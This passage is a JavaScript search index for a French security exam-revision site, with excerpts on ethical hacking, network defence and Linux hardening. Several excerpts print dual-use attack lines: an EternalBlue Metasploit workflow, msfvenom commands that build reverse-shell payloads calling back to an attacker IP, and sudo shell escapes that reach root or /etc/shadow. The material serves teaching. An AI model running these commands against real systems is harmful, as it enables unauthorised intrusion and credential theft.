window.SEARCH_INDEX = [
 {
  "page": "eh.html",
  "url": "eh.html#vocab",
  "subject": "Ethical Hacking",
  "title": "Le vocabulaire qui tombe",
  "text": "1 Le vocabulaire qui tombe Validé Un pentest est un test d'intrusion autorisé, réalisé par un professionnel, pour identifier les vulnérabilités d'un système avant un attaquant. Le hacker éthique ne corrige pas : il prouve et documente. Terme Définition attendue Exemple Menace Cause potentielle d'incident susceptible d'exploiter une vulnérabilité. Un attaquant, un malware, un employé malveillant. Vulnérabilité Faiblesse de conception, d'implémentation, d'installation, de configuration ou d'usage. Mot de passe par défaut, SMBv1, injection SQL. Exploit Code ou technique qui exploite concrètement la vulnérabilité. EternalBlue, payload SQLi, script Metasploit. Risque Probabilité qu'une menace exploite une vulnérabilité et produise un impact. Fuite de données patients, rançon, arrêt de service. ToE Target of Evaluation : système, programme ou réseau analysé. Le serveur web d'une entreprise. Po"
 },
 {
  "page": "eh.html",
  "url": "eh.html#phases",
  "subject": "Ethical Hacking",
  "title": "Les 5 phases & les 3 types de tests",
  "text": "2 Les 5 phases & les 3 types de tests Validé La question « décrivez les 5 étapes » revient chaque année. Apprends la version CEH, puis ajoute le rapport. # Phase Objectif Outils / exemples 1 Reconnaissance (footprinting) Collecter un maximum d'informations sur la cible sans (ou avec) interaction. Whois, DNS, OSINT, Google Dorks, theHarvester, Maltego, Shodan. 2 Scanning & énumération Découvrir hôtes, ports, services, versions, OS, utilisateurs et partages. Nmap, nbtscan, enum4linux, Nikto, Gobuster, Nessus. 3 Obtention d'accès (exploitation) Exploiter une vulnérabilité pour obtenir un premier accès. Metasploit, sqlmap, Hydra, Burp Suite, exploit public. 4 Maintien d'accès (persistance) Conserver l'accès : backdoor, compte, tâche planifiée, rootkit. Meterpreter, persistence, cron, service, clé SSH. 5 Effacement des traces Supprimer ou modifier les preuves : logs, fichiers, historique. Ant"
 },
 {
  "page": "eh.html",
  "url": "eh.html#passive",
  "subject": "Ethical Hacking",
  "title": "OSINT & reconnaissance passive",
  "text": "3 OSINT & reconnaissance passive Validé Reconnaissance passive : collecter des informations sans interagir directement avec la cible. Active : envoyer du trafic à la cible (scan, requêtes, connexions). Le passif est discret mais peut être incomplet ; l'actif est plus fiable mais détectable. Le footprinting Le footprinting rassemble tout ce qui est disponible sur l'organisation : site web, téléphone/fax/VoIP, actualités, offres d'emploi (technologies utilisées), clients/fournisseurs, archives web, réseaux sociaux, métadonnées de documents. Les 3 sources à citer Technique : WHOIS, DNS, certificats, Shodan, en-têtes HTTP, technologies web. Humaine : réseaux sociaux, organigramme, emails, offres d'emploi, conférences. Documentaire : PDF, métadonnées, archives, brevets, communiqués. Les outils OSINT à connaître Outil Ce qu'il fait Quand l'utiliser WHOIS Informations d'enregistrement d'un doma"
 },
 {
  "page": "eh.html",
  "url": "eh.html#nmap",
  "subject": "Ethical Hacking",
  "title": "Nmap & reconnaissance active",
  "text": "4 Nmap & reconnaissance active Validé Nmap envoie des paquets à la cible : c'est donc de la reconnaissance active . Il permet de découvrir les hôtes, les ports, les services, les versions et l'OS. Option Rôle Piège -sP / -sn Découverte d'hôtes sans scan de ports (ping scan). Ne dit pas si les ports sont ouverts. -sS Scan SYN « half-open » : rapide et discret. Nécessite les privilèges root. -sT Scan TCP connect : handshake complet. Plus visible dans les logs. -sV Détection de version des services. Ce n'est pas la détection d'OS. -O Détection du système d'exploitation. Nécessite souvent root et une cible accessible. -p- Scan des 65 535 ports TCP. Très long ; à réserver aux cibles sérieuses. -Pn Ne pas faire de découverte d'hôte (considérer la cible comme up). Utile si l'ICMP est bloqué. -A Mode agressif : OS, versions, scripts, traceroute. Très bruyant. --script Exécuter un ou plusieurs sc"
 },
 {
  "page": "eh.html",
  "url": "eh.html#enum",
  "subject": "Ethical Hacking",
  "title": "Énumération & scan de vulnérabilités",
  "text": "5 Énumération & scan de vulnérabilités Validé Après le scan, on cherche qui et quoi : utilisateurs, groupes, partages, services, versions, domaines. C'est l'énumération. Service Outils Informations SMB / Windows enum4linux , smbclient , scripts NSE smb-* Partages, utilisateurs, groupes, politique de mot de passe. NetBIOS nbtscan Noms NetBIOS, groupe de travail/domaine, adresses MAC. DNS dnsenum , dnsrecon , dig Sous-domaines, MX, NS, transferts de zone. LDAP ldapsearch , NSE ldap-* Base DN, utilisateurs, annuaire, anonymous bind. SNMP snmpwalk Interfaces, routes, versions, communauté par défaut. HTTP gobuster , dirb , nikto , whatweb Répertoires, fichiers, CMS, en-têtes, vulnérabilités web. Legion vs nbtscan (question 2024 et 2025) Legion Framework d'énumération automatisé avec interface graphique. Il orchestre Nmap puis lance automatiquement des outils spécialisés selon les services dét"
 },
 {
  "page": "eh.html",
  "url": "eh.html#msf",
  "subject": "Ethical Hacking",
  "title": "Exploitation avec Metasploit",
  "text": "6 Exploitation avec Metasploit Validé Metasploit est un framework d'exploitation qui regroupe modules, payloads, encoders et base de données de vulnérabilités. Il sert à identifier et exploiter des vulnérabilités, pas à scanner passivement. Type de module Rôle Exemple Exploit Exploite une vulnérabilité précise. exploit/windows/smb/ms17_010_eternalblue Auxiliary Reconnaissance, scan, brute force, sans exploitation directe. auxiliary/scanner/ssh/ssh_login Payload Code exécuté après l'exploit (shell, Meterpreter). windows/meterpreter/reverse_tcp Encoder Encode le payload pour éviter certaines signatures. x86/shikata_ga_nai NOP Remplissage pour stabiliser les exploits mémoire. x86/opty2 Post Actions après exploitation. post/windows/gather/hashdump Workflow msfconsole msfconsole search ms17_010 use exploit/windows/smb/ms17_010_eternalblue show options set RHOSTS 192.168.1.20 set LHOST 192.168"
 },
 {
  "page": "eh.html",
  "url": "eh.html#payloads",
  "subject": "Ethical Hacking",
  "title": "Payloads, shells & msfvenom",
  "text": "7 Payloads, shells & msfvenom Validé Les types de payloads Type Principe Usage Single Tout le code est dans un seul fichier. Simple, mais plus gros et plus détectable. Stager Petit code qui télécharge la suite (stage). Contourne les limites de taille ; nécessite un handler. Stage Charge utile téléchargée par le stager. Souvent Meterpreter. Bind shell La cible ouvre un port, l'attaquant s'y connecte. Bloqué par les pare-feux entrants. Reverse shell La cible se connecte vers l'attaquant. Traverse mieux les NAT et pare-feux sortants. msfvenom Génère un payload personnalisé pour une plateforme et un format donnés. msfvenom -p windows/x64/meterpreter/reverse_tcp \\ LHOST=192.168.1.50 LPORT=4444 -f exe -o shell.exe msfvenom -p linux/x64/shell_reverse_tcp \\ LHOST=192.168.1.50 LPORT=4444 -f elf -o shell.elf msfvenom -p php/meterpreter/reverse_tcp \\ LHOST=192.168.1.50 LPORT=4444 -f raw -o shell.ph"
 },
 {
  "page": "eh.html",
  "url": "eh.html#post",
  "subject": "Ethical Hacking",
  "title": "Post-exploitation & persistance",
  "text": "8 Post-exploitation & persistance Validé Une fois l'accès obtenu, l'attaquant cherche à augmenter ses privilèges , collecter des informations , se déplacer et rester . 1 · Élévation de privilèges Exploiter une configuration faible (sudo mal configuré, service vulnérable, SUID, tâche planifiée, token Windows). Sous Windows : UAC bypass, token theft, services non quotés. 2 · Collecte de credentials hashdump , Mimikatz, SAM, LSASS, tickets Kerberos, fichiers de configuration, variables d'environnement, navigateurs. 3 · Mouvement latéral Pass-the-Hash, Pass-the-Ticket, RDP, SMB, WinRM, SSH, pivoting via portfwd ou un tunnel. 4 · Persistance Compte local, clé SSH, tâche planifiée, service, run key, cron, rootkit. Objectif : survivre à un redémarrage. 5 · Exfiltration Copie de données, compression, chiffrement, canal DNS/HTTP, cloud. Impact confidentiality. 6 · Nettoyage Suppression des outils"
 },
 {
  "page": "eh.html",
  "url": "eh.html#brute",
  "subject": "Ethical Hacking",
  "title": "Brute force & mots de passe",
  "text": "9 Brute force & mots de passe Validé Brute force Teste toutes les combinaisons possibles d'un espace de caractères. Efficace sur les mots de passe courts, inefficace sur les longs et complexes. Très bruyant. Dictionnaire Teste une liste de mots préexistante (rockyou.txt, mots courants, variantes). Plus rapide et plus efficace si le mot de passe est un mot du dictionnaire ou une variante simple. Contexte d'usage : formulaires de login, SSH, RDP, FTP, HTTP Basic, hashs volés, Wi-Fi (handshake). Le brute force en ligne est limité par le réseau et les protections ; le cracking hors ligne est limité par la puissance GPU et la robustesse du hash. Outils Outil Usage Hydra Brute force multi-protocoles (SSH, FTP, HTTP, RDP…). -l utilisateur, -L liste, -p mot de passe, -P liste. Medusa Brute force parallèle, rapide. Patator Brute force modulaire, flexible. John the Ripper Cracking de hashs, règles"
 },
 {
  "page": "eh.html",
  "url": "eh.html#web",
  "subject": "Ethical Hacking",
  "title": "Pentest web & OWASP",
  "text": "10 Pentest web & OWASP Validé Les applications web sont exposées publiquement : elles sont la cible privilégiée. Le pentest web suit une méthodologie (OWASP WSTG) et couvre l'authentification, les sessions, les entrées, la logique métier et les API. OWASP Top 10 — 2021 Risque Ce que c'est Exemple / défense A01 Broken Access Control Contrôle d'accès défaillant : IDOR, accès admin sans rôle. Vérifier les droits côté serveur, deny by default. A02 Cryptographic Failures Chiffrement absent ou faible, données sensibles en clair. TLS, hash fort, ne pas stocker de secrets en clair. A03 Injection SQL, NoSQL, commande, LDAP, XSS. Requêtes préparées, validation, encodage. A04 Insecure Design Défaut de conception, pas seulement de code. Threat modeling, principes security by design. A05 Security Misconfiguration Services par défaut, comptes par défaut, en-têtes absents. Durcissement, CIS, suppressio"
 },
 {
  "page": "eh.html",
  "url": "eh.html#report",
  "subject": "Ethical Hacking",
  "title": "Rapport & méthodologies",
  "text": "11 Rapport & méthodologies Validé Le rapport de pentest Synthèse exécutive : périmètre, dates, niveau de risque global, 3 à 5 messages clés, recommandation. Méthodologie : référentiel, type de test (black/grey/white), outils, limites, autorisations. Constats : pour chaque vulnérabilité — description, preuve (capture, requête), CVSS, impact métier, recommandation, référence CVE/OWASP. Plan de remédiation : priorisé (critique → faible), effort, responsable, délai. Annexes : périmètre détaillé, logs, commandes, matrices de risque. Le rapport doit être compréhensible par un décideur et exploitable par un technicien. Il ne doit pas contenir de données sensibles inutiles. Les méthodologies Référentiel Focus À citer pour… PTES Pentest complet, 7 phases. Déroulé général d'une mission. OWASP WSTG Applications web, mobiles, API ; 12 catégories de tests. Pentest web. NIST SP 800-115 Planning, disco"
 },
 {
  "page": "eh.html",
  "url": "eh.html#annales",
  "subject": "Ethical Hacking",
  "title": "Annales : questions ouvertes corrigées",
  "text": "12 Annales : questions ouvertes corrigées Validé Les 5 questions ouvertes de 2025, avec une réponse structurée. Entraîne-toi à les rédiger en 8 à 10 minutes chacune. 2025 · Q1 — Stratégie OSINT avec Maltego, Shodan et DNSdumpster 1. Collecte : partir du domaine et des URLs. DNSdumpster pour cartographier les sous-domaines, MX, TXT et hôtes ; Shodan pour les services exposés et les bannières ; Maltego pour relier domaines, IP, emails, personnes et organisations. Compléter avec WHOIS, crt.sh, theHarvester. 2. Nettoyage : dédoublonner, normaliser (domaines, IP), dater, croiser au moins deux sources, écarter les faux positifs, classer par niveau de confiance et par pertinence pour le périmètre. 3. Influence sur l'exploitation : les services exposés orientent le choix des vecteurs (VPN, webmail, RDP), les versions logicielles orientent les CVE, les emails alimentent le phishing ciblé, la topo"
 },
 {
  "page": "eh.html",
  "url": "eh.html#quiz",
  "subject": "Ethical Hacking",
  "title": "Quiz express",
  "text": "? Quiz express 10 questions tirées au hasard. Corrigé immédiat, score final. Objectif : 8/10 avant l'examen."
 },
 {
  "page": "eh.html",
  "url": "eh.html#flashcards",
  "subject": "Ethical Hacking",
  "title": "Flashcards",
  "text": "⚡ Flashcards Récupération active : lis la question, réponds à voix haute, retourne la carte. Lancer les flashcards → Espace = retourner · ← → = naviguer"
 },
 {
  "page": "reseau.html",
  "url": "reseau.html#fond",
  "subject": "Sécurité Réseaux",
  "title": "DICP & principes de sécurité réseau",
  "text": "1 DICP & principes de sécurité réseau Validé La SSI garantit que les ressources sont utilisées dans le cadre prévu. On évalue un bien selon DICP : Critère Définition Exemple réseau Disponibilité Accessible au moment voulu par les personnes autorisées. Redondance, anti-DDoS, HA. Intégrité Exactitude et complétude ; toute modification illégitime est détectée. Hash, signature, TLS, contrôle d'intégrité. Confidentialité Accessible uniquement aux personnes autorisées. Chiffrement, VPN, segmentation. Preuve Traçabilité, authentification, imputabilité. Logs, horodatage, certificats, audit. Vulnérabilité, menace, attaque, risque Vulnérabilité = faiblesse de conception, d'implémentation, d'installation, de configuration ou d'usage. Menace = cause potentielle d'incident. Attaque = concrétisation d'une menace exploitant une vulnérabilité. Risque = probabilité × impact. Les 7 principes firewall Moin"
 },
 {
  "page": "reseau.html",
  "url": "reseau.html#attaques",
  "subject": "Sécurité Réseaux",
  "title": "Attaques réseau & contre-mesures",
  "text": "2 Attaques réseau & contre-mesures Validé On classe les attaques selon l'effet sur le DICP : interruption (disponibilité), interception (confidentialité), modification (intégrité), fabrication (authenticité). Attaque Principe Contre-mesures Sniffing Écoute du trafic. Sur switch, l'unicast n'est pas diffusé : il faut ARP spoofing, MAC flooding, port mirror ou accès physique. Chiffrement (TLS, VPN, MACsec), 802.1X, ports sécurisés, détection ARP. MAC spoofing Usurper une adresse MAC pour se faire passer pour un équipement légitime. 802.1X, port security, contrôle d'accès physique, DAI. ARP poisoning Fausses réponses ARP pour rediriger le trafic (MITM). Dynamic ARP Inspection, ARP statique, chiffrement, segmentation. VLAN hopping Passer d'un VLAN à un autre via double tagging ou switch spoofing. Désactiver le trunk sur les ports utilisateurs, VLAN natif dédié, port security. DHCP spoofing F"
 },
 {
  "page": "reseau.html",
  "url": "reseau.html#segmentation",
  "subject": "Sécurité Réseaux",
  "title": "Segmentation, VLAN & DMZ",
  "text": "3 Segmentation, VLAN & DMZ Validé Pourquoi segmenter ? Limiter la propagation d'une attaque (compartmentation). Appliquer des politiques différenciées par zone. Réduire les domaines de broadcast et améliorer les performances. Faciliter l'audit et la traçabilité. La démarche s'appelle segmentation réseau ou cloisonnement . Elle s'appuie sur des sous-réseaux IP, des VLAN (802.1Q), des ACL et des firewalls. VLAN Réseau local virtuel : sépare logiquement des machines sur une même infrastructure physique. Les communications inter-VLAN passent par un routeur ou un firewall. Affectation statique (port) ou dynamique (MAC, 802.1X). DMZ Zone démilitarisée entre Internet et le réseau interne. Elle héberge les services accessibles depuis l'extérieur (web, mail, DNS, reverse proxy). C'est une zone « perdable » : si elle tombe, le LAN reste protégé. DMZ : définition et avantages Une DMZ est un sous-ré"
 },
 {
  "page": "reseau.html",
  "url": "reseau.html#firewalls",
  "subject": "Sécurité Réseaux",
  "title": "Firewalls : types & fonctionnement",
  "text": "4 Firewalls : types & fonctionnement Validé Un firewall contrôle ce qui passe entre deux zones et applique une politique de sécurité. Il ne sert pas seulement à bloquer : il autorise le trafic utile et journalise. Type Fonctionnement Avantages Limites Filtre de paquets (sans état) Examine chaque paquet isolément : IP source/destination, ports, protocole. Simple, rapide, peu coûteux. Pas de contexte ; vulnérable au spoofing, fragmentation, SYN flood ; règles complexes. Firewall avec état (stateful) Maintient une table des connexions et autorise les paquets established/related . Plus sûr, gère le retour, protège contre certains scans et SYN floods. Consomme de la mémoire ; table d'état à protéger. Proxy applicatif Termine la connexion et en ouvre une autre (couche 7). Rupture protocolaire, inspection du contenu, authentification. Plus lent, un proxy par protocole, point de défaillance. NGF"
 },
 {
  "page": "reseau.html",
  "url": "reseau.html#regles",
  "subject": "Sécurité Réseaux",
  "title": "Règles de filtrage : méthode & exercice",
  "text": "5 Règles de filtrage : méthode & exercice Validé C'est la question qui rapporte le plus de points. Une règle se lit dans un sens : source → destination, protocole, port destination, action. Le retour est géré par l'état ( established ) ou par une règle explicite. Méthode en 5 étapes Identifier les zones et leur niveau de confiance : Internet, DMZ, LAN, admin. Lister les flux nécessaires : qui consomme quel service, dans quel sens. Écrire du plus sûr au moins sûr : admin → LAN → DMZ → Internet. Être explicite : jamais ANY en source/destination si ce n'est pas nécessaire ; préciser les ports. Terminer par DENY ALL et journaliser les refus. Pièges classiques Oublier le retour (si firewall sans état). Mettre une règle générale avant une règle spécifique : le premier match gagne. Ouvrir l'administration (SSH/RDP) à tout Internet. Autoriser ANY → ANY « pour que ça marche ». Ne pas autoriser le"
 },
 {
  "page": "reseau.html",
  "url": "reseau.html#proxy",
  "subject": "Sécurité Réseaux",
  "title": "Proxies & reverse proxies",
  "text": "6 Proxies & reverse proxies Validé Proxy forward (sortant) Le client se connecte explicitement au proxy, qui se connecte à Internet à sa place. Le proxy termine la connexion et en ouvre une nouvelle : c'est la rupture protocolaire . Filtrage d'URL et de contenu. Cache. Anonymisation des IP internes. Authentification et journalisation. Antivirus / analyse de contenu. Reverse proxy (entrant) Les utilisateurs Internet accèdent indirectement aux serveurs internes. Il masque les serveurs, termine TLS, filtre et répartit la charge. Protection des serveurs (WAF). Load balancing. Cache. Terminaison SSL/TLS. Masquage de l'architecture. Rupture protocolaire : attention au piège Un proxy ne garantit la rupture que si tout le trafic est obligé de passer par lui. Si le serveur web est accessible directement depuis Internet via FW1, un attaquant peut contourner le proxy. Il faut des règles de firewall"
 },
 {
  "page": "reseau.html",
  "url": "reseau.html#ids",
  "subject": "Sécurité Réseaux",
  "title": "IDS/IPS & placement",
  "text": "7 IDS/IPS & placement Validé IDS IPS Mode Passif (miroir, TAP), détecte et alerte. Inline, détecte et bloque. Impact N'arrête pas l'attaque. Peut bloquer, mais peut créer un goulot ou des faux positifs bloquants. Types NIDS (réseau), HIDS (hôte). NIPS, HIPS. Détection Signatures, anomalies, comportement. Idem + actions de blocage. Où placer l'IDS ? Entre FW1 et la DMZ : voit les attaques qui ont passé le premier filtre ; priorité n°1. Entre FW2 et le LAN : détecte les mouvements latéraux et les compromissions depuis la DMZ. Dans chaque DMZ : surveillance spécifique des serveurs exposés. En amont de FW1 : visibilité sur toutes les attaques, mais beaucoup de bruit. Réponse type Un IDS se place en sortie de firewall, sur le segment qu'il surveille, idéalement entre le firewall externe et la DMZ, puis entre le firewall interne et le LAN. Il doit voir le trafic réellement dirigé vers les acti"
 },
 {
  "page": "reseau.html",
  "url": "reseau.html#ipsec",
  "subject": "Sécurité Réseaux",
  "title": "IPsec & VPN",
  "text": "8 IPsec & VPN Validé Un VPN étend un réseau privé sur un réseau public. Il sert à interconnecter des sites ou à donner un accès distant au réseau d'entreprise. Le tunnel encapsule un paquet non routable dans un paquet routable. Services assurés par IPsec Confidentialité (ESP). Intégrité (AH ou ESP). Authentification des correspondants. Anti-rejeu (numéro de séquence). Gestion des clés (IKE). AH ESP Confidentialité Non Oui (chiffrement) Intégrité / authenticité Oui, sur tout le paquet IP Oui, sur la charge utile NAT Incompatible (hash de l'en-tête IP) Problème en mode transport (ports chiffrés) → NAT-T Usage Authentification sans chiffrement VPN, confidentialité Modes transport et tunnel Transport Protège la charge utile (TCP/UDP) mais conserve l'en-tête IP d'origine. Adapté à une communication hôte à hôte . Tunnel Encapsule tout le paquet IP dans un nouveau paquet IP. Adapté aux VPN site"
 },
 {
  "page": "reseau.html",
  "url": "reseau.html#wifi",
  "subject": "Sécurité Réseaux",
  "title": "Wi-Fi & 802.1X",
  "text": "9 Wi-Fi & 802.1X Validé Le Wi-Fi est un canal de diffusion : toute personne à portée peut écouter. La sécurité repose sur le chiffrement, l'authentification et la séparation des flux. Protocole Chiffrement Authentification Verdict WEP RC4, IV 24 bits Clé partagée Totalement cassé : IV réutilisés, CRC-32 faible, bit-flipping. Ne jamais utiliser. WPA TKIP PSK / 802.1X Obsolète, à remplacer. WPA2 Personal CCMP/AES PSK (phrase de passe) Correct si phrase longue ; un secret partagé pour tous. WPA2 Enterprise CCMP/AES 802.1X + RADIUS Recommandé en entreprise : identité par utilisateur. WPA3 AES-GCMP SAE / 802.1X Le plus robuste : résiste mieux au offline guessing, PMF. Failles du WEP (question d'annale) Confidentialité : RC4 avec IV de 24 bits, réutilisation fréquente des IV, attaques statistiques permettant de retrouver la clé en quelques minutes. Intégrité : CRC-32 linéaire et faible, falsif"
 },
 {
  "page": "reseau.html",
  "url": "reseau.html#ddos",
  "subject": "Sécurité Réseaux",
  "title": "DDoS & sécurité périmétrique",
  "text": "10 DDoS & sécurité périmétrique Validé Un DDoS sature une ressource (bande passante, connexions, CPU, application) depuis de nombreuses sources, souvent un botnet. Il est difficile à arrêter avec le seul firewall d'entreprise. Pourquoi le firewall ne suffit pas La bande passante est saturée en amont : le firewall ne voit même pas le trafic. Les équipements ont une capacité limitée (table d'état, CPU). Le trafic peut ressembler à du trafic légitime (requêtes HTTP valides). Quand le trafic atteint le firewall, une partie des dégâts est déjà faite. Un firewall mal dimensionné devient lui-même le goulot. Où placer l'anti-DDoS ? Chez le FAI / ISP : filtrage en amont, avant la liaison de l'entreprise. Services cloud de scrubbing (Cloudflare, Akamai) : absorption et nettoyage du trafic. Points d'échange Internet (IXP) : protection très en amont. CDN / anycast : répartition géographique et absor"
 },
 {
  "page": "reseau.html",
  "url": "reseau.html#archi",
  "subject": "Sécurité Réseaux",
  "title": "Architectures-types & cas d'entreprise",
  "text": "11 Architectures-types & cas d'entreprise Validé Intégrer un serveur Active Directory Un AD ne doit jamais être exposé directement à Internet. Deux options : AD interne uniquement + accès distant par VPN. RODC en DMZ (Read-Only Domain Controller) pour les authentifications externes, avec LDAPS, MFA, filtrage strict et synchronisation sécurisée. L'AD principal reste dans le LAN. Ports à filtrer : 389/636 (LDAP/LDAPS), 88 (Kerberos), 3268/3269 (catalogue global). Ne jamais ouvrir tout l'AD ; passer par un reverse proxy ou une passerelle d'authentification. DNS interne vs autoritaire Le résolveur interne répond aux postes du LAN et ne doit pas être exposé. Le DNS autoritaire du domaine public est en DMZ, accessible depuis Internet. On peut utiliser le split DNS pour que le même nom resolve différemment à l'intérieur et à l'extérieur. Messagerie sécurisée : 4 solutions Solution Avantage Inco"
 },
 {
  "page": "reseau.html",
  "url": "reseau.html#annales",
  "subject": "Sécurité Réseaux",
  "title": "Annales corrigées",
  "text": "12 Annales corrigées Validé 2023 · Avantages de plusieurs sous-réseaux Meilleure sécurité par segmentation, isolation des services, limitation de la propagation des attaques, réduction des domaines de broadcast, politiques différenciées, meilleure gestion du trafic. La démarche s'appelle segmentation ou cloisonnement réseau . 2023 · DMZ : définition et principe Zone isolée entre Internet et le LAN, hébergeant les services publics. Principe : défense en profondeur ; on ajoute l'isolation, la limitation des dégâts et le moindre privilège. 2023 · Deux firewalls : avantages, même marque, marques différentes Cascade : double filtrage, protection supplémentaire, séparation DMZ/LAN. Même marque : gestion centralisée, homogénéité, formation unique. Marques différentes : diversité de défense, pas de faille commune, pas de SPOF. Les principes : défense en profondeur et diversité. 2023 · Proxy / re"
 },
 {
  "page": "reseau.html",
  "url": "reseau.html#quiz",
  "subject": "Sécurité Réseaux",
  "title": "Quiz express",
  "text": "? Quiz express 10 questions tirées au hasard. Objectif : 8/10."
 },
 {
  "page": "reseau.html",
  "url": "reseau.html#flashcards",
  "subject": "Sécurité Réseaux",
  "title": "Flashcards",
  "text": "⚡ Flashcards Lancer les flashcards → Espace = retourner · ← → = naviguer"
 },
 {
  "page": "os.html",
  "url": "os.html#archi",
  "subject": "Sécurité des OS",
  "title": "Architecture des OS & noyaux",
  "text": "1 Architecture des OS & noyaux Validé Le noyau est le programme qui gère les ressources matérielles et fournit aux applications une interface (appels système). Il s'exécute en mode noyau (privilégié) ; les applications en mode utilisateur . Type de noyau Principe Avantages Inconvénients / exemples Monolithique non modulaire Tout le code (noyau + pilotes) dans un seul bloc binaire. Performant, simple à concevoir. Difficile à maintenir ; une erreur peut tout bloquer. Anciens Unix. Monolithique modulaire Noyau de base + modules chargeables à chaud. Maintenance, chargement dynamique, performances. Une erreur de module peut déstabiliser le système. Linux . Micro-noyau Noyau minimal (ordonnanceur, IPC, mémoire) ; services et pilotes en espace utilisateur. Robustesse, isolation, maintenance. Beaucoup d'appels système/IPC, performances moindres. QNX, L4. Hybride Combine micro-noyau et code monol"
 },
 {
  "page": "os.html",
  "url": "os.html#principes",
  "subject": "Sécurité des OS",
  "title": "Principes & niveaux de durcissement",
  "text": "2 Principes & niveaux de durcissement Validé Les 4 principes Principe Définition Exemple Minimisation Réduire la complexité et la surface d'attaque au strict nécessaire ; facilite le suivi et la mise à jour. Désinstaller les services inutiles, système minimal, un seul rôle par serveur. Moindre privilège Chaque entité n'a que les droits strictement nécessaires ; en cas de compromission, les dégâts sont limités ( fail securely ). Apache lance un processus root puis passe à www-data ; sudo au lieu de root. Défense en profondeur Plusieurs couches indépendantes et complémentaires ; chaque couche doit être franchie. Auth + chiffrement + firewall + logs + EDR. Veille & maintenance Surveiller les vulnérabilités, appliquer les correctifs, journaliser et archiver. Patch management, CERT, logs centralisés. Le durcissement consiste à vérifier que ces principes sont respectés et à contrôler méthodiqu"
 },
 {
  "page": "os.html",
  "url": "os.html#comptes",
  "subject": "Sécurité des OS",
  "title": "Comptes Linux & fichiers sensibles",
  "text": "3 Comptes Linux & fichiers sensibles Validé /etc/passwd Lisible par tous. Format : nom:x:UID:GID:GECOS:home:shell . Le x renvoie le mot de passe vers /etc/shadow . Un shell /sbin/nologin ou /bin/false désactive la connexion. /etc/shadow Lisible uniquement par root. Contient le hash, la date du dernier changement, les durées min/max, l'avertissement, l'inactivité et l'expiration. C'est là que sont stockés les mots de passe. Salim:x:1029:1001:Salim Ben:/home/salim:/bin/bash # champs : login, mdp, UID, GID, commentaire, home, shell # erreur classique : GID non numérique + shell /bin/passwd invalide UID, GID et comptes de service UID 0 = root. Un seul compte doit avoir l'UID 0 ; un doublon est une porte dérobée. UID dupliqué = confusion d'identité, contournement des permissions, audit impossible. Chaque service doit avoir son propre compte système, sans shell de connexion, et être désactivé "
 },
 {
  "page": "os.html",
  "url": "os.html#perms",
  "subject": "Sécurité des OS",
  "title": "Permissions & umask",
  "text": "4 Permissions & umask Validé Trois catégories (propriétaire, groupe, autres) et trois droits (lecture r=4 , écriture w=2 , exécution x=1 ). Valeur Droits Usage 7 rwx Lecture + écriture + exécution. 6 rw- Fichier de données. 5 r-x Exécutable / répertoire traversable. 4 r-- Lecture seule. 0 --- Aucun droit. Calcul de l'umask Les droits par défaut sont 666 pour un fichier et 777 pour un répertoire. L'umask retire des droits : umask 022 → fichier 666 - 022 = 644 (rw-r--r--) répertoire 777 - 022 = 755 (rwxr-xr-x) umask 027 → fichier 666 - 027 = 640 (rw-r-----) répertoire 777 - 027 = 750 (rwxr-x---) umask 002 → fichier 666 - 002 = 664 (rw-rw-r--) répertoire 777 - 002 = 775 (rwxrwxr-x) ANSSI recommande umask 0027. Le umask par défaut est souvent 0022, trop permissif. Pour un répertoire, le droit x permet d'y entrer et de traverser ; pour un fichier, il permet de l'exécuter. À retenir Un fichier"
 },
 {
  "page": "os.html",
  "url": "os.html#suid",
  "subject": "Sécurité des OS",
  "title": "SUID, SGID, sticky bit",
  "text": "5 SUID, SGID, sticky bit Validé Bit Valeur Effet Exemple SUID 4 Le programme s'exécute avec l'EUID du propriétaire, pas celui de l'utilisateur. /usr/bin/passwd (root) permet de changer son mot de passe. SGID 2 Sur un fichier : s'exécute avec le GID du groupe. Sur un répertoire : les nouveaux fichiers héritent du groupe. Répertoire d'équipe. Sticky 1 Dans un répertoire world-writable, seul le propriétaire peut supprimer son fichier. /tmp (1777). chmod 4755 programme # SUID chmod 2755 repertoire # SGID chmod 1777 /tmp # sticky find / -perm -4000 -type f 2>/dev/null # lister les SUID Pourquoi le SUID root est dangereux Un binaire SUID root s'exécute avec EUID 0 , même si l'utilisateur est standard. S'il est vulnérable, l'attaquant obtient root. Le risque dépend de la qualité du programme, pas de l'intention. Surface d'attaque Exemple concret Conséquence Entrées utilisateur Buffer overflow d"
 },
 {
  "page": "os.html",
  "url": "os.html#sudo",
  "subject": "Sécurité des OS",
  "title": "Sudo",
  "text": "6 Sudo Validé sudo permet à un utilisateur d'exécuter une commande avec les privilèges d'un autre compte, selon une politique écrite dans /etc/sudoers et /etc/sudoers.d/ . Il permet la traçabilité (logs) et évite le partage du mot de passe root. Syntaxe login/group host = (utilisateur cible) commande(s) salim ALL = (ALL) /bin/date yann ALL = (ALL) NOPASSWD: /sbin/reboot %webadmin ALL = (ALL) /etc/init.d/apache2 %wheel ALL = (ALL) ALL, !/bin/su Les pièges de configuration Configuration Problème Attaque NOPASSWD Aucune réauthentification. Quiconque accède au compte exécute la commande. ALL=(ALL) ALL Root complet déguisé. Escalade immédiate. Wildcard /etc/httpd/* Le shell peut développer des chemins. sudoedit /etc/httpd/../shadow → lecture/écriture de /etc/shadow . Éditeur autorisé ( vi , vim ) Shell escape depuis l'éditeur. :!sh → shell root. Script utilisateur autorisé Le script est modif"
 },
 {
  "page": "os.html",
  "url": "os.html#pam",
  "subject": "Sécurité des OS",
  "title": "PAM, capabilities, MAC",
  "text": "7 PAM, capabilities, MAC Validé PAM PAM ( Pluggable Authentication Modules ) centralise l'authentification et la gestion de session. Les applications appellent PAM ; PAM applique une pile de modules définie dans /etc/pam.d/ . auth : vérifier l'identité. account : vérifier que le compte est autorisé (expiration, horaire). password : changer le mot de passe. session : préparer l'environnement (montage, limites). Modules utiles : pam_unix , pam_pwquality (complexité), pam_faillock (verrouillage), pam_mkhomedir , pam_namespace , pam_tally2 . PAM permet donc la centralisation de l'authentification et l' application d'une politique de mot de passe . Capabilities Découpent les privilèges root en unités granulaires. Au lieu de donner tout root à un binaire, on lui donne seulement cap_net_bind_service , cap_net_raw , etc. getcap -r / 2>/dev/null setcap cap_net_bind_service=+ep /usr/bin/mon_servic"
 },
 {
  "page": "os.html",
  "url": "os.html#durci",
  "subject": "Sécurité des OS",
  "title": "Durcissement Linux",
